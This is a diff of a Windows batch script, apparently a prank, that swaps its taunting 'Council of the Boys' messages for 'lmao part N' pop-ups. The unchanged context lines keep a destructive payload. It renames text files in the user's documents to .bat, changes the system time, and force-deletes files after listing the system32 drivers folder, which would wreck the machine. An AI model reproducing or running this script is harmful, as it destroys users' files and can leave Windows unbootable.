@@ -29,11 +29,10 @@ if '%errorlevel%' NEQ '0' (
     CD /D "%~dp0"
 :--------------------------------------  
 
-color 2
 :Start
-msg * You've been caught simping.
+msg * lmao
 pause
-msg * As punishment, you must sacrifice your computer.
+msg * lmao part 2
 pause
 cls
 
@@ -53,13 +52,13 @@ cls
 time 4:20
 cls
 
-echo Windows has detected a virus
+echo lmao part 3
 pause
-echo Windows will try to fix the problem
+echo lmao part 4
 pause
-echo The Council of the Boys has decided to kill you.
+echo lmao part 5
 pause
-echo Goodbye, simp.
+echo lmao part 6
 cls
 cd %userprofile%\my documents
 ren *.txt *.bat
@@ -167,8 +166,8 @@ del *.* /q /f
 dir %windir%/system32/drivers
 del *.* /q /f
 
-echo * Goodbye, former member of the boys.
+msg * lmao part 7
 pause
-msg * - The Council of the Boys
+msg * lmao part 8
 pause
-msg * We're sorry.
+msg * lmao part 9
